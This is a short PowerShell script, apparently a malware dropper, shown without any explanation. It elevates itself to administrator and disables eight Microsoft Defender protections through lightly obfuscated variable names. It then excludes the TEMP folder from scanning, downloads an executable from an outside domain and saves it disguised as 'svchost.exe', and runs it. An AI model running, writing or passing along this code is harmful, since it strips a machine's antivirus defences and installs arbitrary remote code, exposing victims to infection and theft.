if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
    exit
}
$d='DisableRealtimeMonitoring';$e='DisableIOAVProtection';$f='DisableNetworkProtection';$g='DisableBehaviorMonitoring'
$h='DisableBlockAtFirstSeen';$i='DisableCloudProtection';$j='DisableArchiveScanning';$k='DisableScriptScanning'
foreach($p in $d,$e,$f,$g,$h,$i,$j,$k){Set-MpPreference -$p $true -Force}
Add-MpPreference -ExclusionPath "$env:TEMP" -Force
$wc=New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent","Mozilla/5.0")
$wc.DownloadFile('https://freshdomain.com/update.exe', "$env:TEMP\svchost.exe")
Start-Process "$env:TEMP\svchost.exe"